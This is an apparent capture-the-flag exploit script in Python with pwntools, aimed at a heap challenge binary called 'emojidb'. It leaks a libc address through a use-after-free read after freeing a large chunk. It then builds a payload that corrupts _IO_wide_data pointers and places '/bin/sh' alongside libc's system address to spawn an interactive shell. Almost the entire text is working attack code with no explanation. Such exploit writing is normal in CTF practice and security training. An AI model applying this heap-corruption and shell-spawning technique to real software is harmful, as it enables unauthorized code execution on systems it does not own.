from pwn import *
import subprocess

binpath = './emojidb'
scriptpath = './exec_emoji.sh'
elf = ELF(binpath)
libc = elf.libc


context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
# context.log_level = 'DEBUG'

gdbscript = '''
gef
# set $arr=(0x0000555555554000+0x00000000002020A0)
# # new
# b *(0x0000555555554000+0xd00)
# # free
# b *(0x0000555555554000+0xea0)
# # open book
# b *(0x0000555555554000+0xe50)
# 
# # b *(0x0000555555554000+0xac8)
# b *(0x0000555555554000+0xe74)
set $offset_main=0x00000000000009D0
'''


def debug(func):
    from functools import wraps
    @wraps(func)
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


def uni_to_utf(data):
    proc = subprocess.run("./wcstombs", shell=True, input=data, stdout=subprocess.PIPE)
    return proc.stdout.rstrip(b'\x00')


def utf_to_uni(data):
    proc = subprocess.run("./mbstowcs", shell=True, input=data, stdout=subprocess.PIPE)
    return proc.stdout


def menu():
    # print(io.recvuntil('🆓'.encode()).decode())
    io.recvuntil('🆓'.encode())
    io.recvuntil("❓".encode())


@debug
def new(size, data):
    menu()
    payload = b''
    payload += "🆕".encode()
    payload += b'%d' % size
    payload += data
    io.sendline(payload)
    io.recvuntil("🆕".encode())


@debug
def free(index):
    menu()
    payload = b''
    payload += '🆓'.encode()
    payload += b"%d" % index
    io.sendline(payload)
    io.recvuntil("🆕".encode())


@debug
def open_book(index):
    menu()
    payload = b''
    payload += "📖".encode()
    payload += b"%d" % index
    io.sendline(payload)
    io.recvuntil("❓".encode())
    io.recvuntil("❓".encode())
    data = io.recvuntil("🆕".encode())
    return utf_to_uni(data[:-4])

# io = gdb.debug([scriptpath], aslr=True, gdbscript=gdbscript)
io = process(scriptpath)

# print("Hit enter to continue")
# input()

new(0x410 // 4, b'A')  # 1
new(0x28 // 4, b'B')  # 2

free(1)

data = open_book(1)
addr_main_arena = u64(data.ljust(8, b'\x00'))
addr_libc = addr_main_arena - 0x3ebca0

assert addr_libc % 0x1000 == 0

print('addr_main_arena = 0x{:x}'.format(addr_main_arena))
print('addr_libc = 0x{:x}'.format(addr_libc))

free(2)

for i in range(5):
    new(0x400 // 4, b'C')

OFFSET_IO_WIDE_DATA_1_SHORTBUF = 0x3eb9e8


addr_io_wide_data_1_shortbuf = addr_libc + OFFSET_IO_WIDE_DATA_1_SHORTBUF
payload = b''
payload += b'A' * 12
for i in range(10):
    tmp = uni_to_utf(p64(addr_io_wide_data_1_shortbuf))
    payload += tmp
payload += uni_to_utf(b'/bin/sh\x00')
payload += uni_to_utf(p64(addr_libc + libc.symbols['system']))

menu()
io.sendline(payload)


io.interactive()
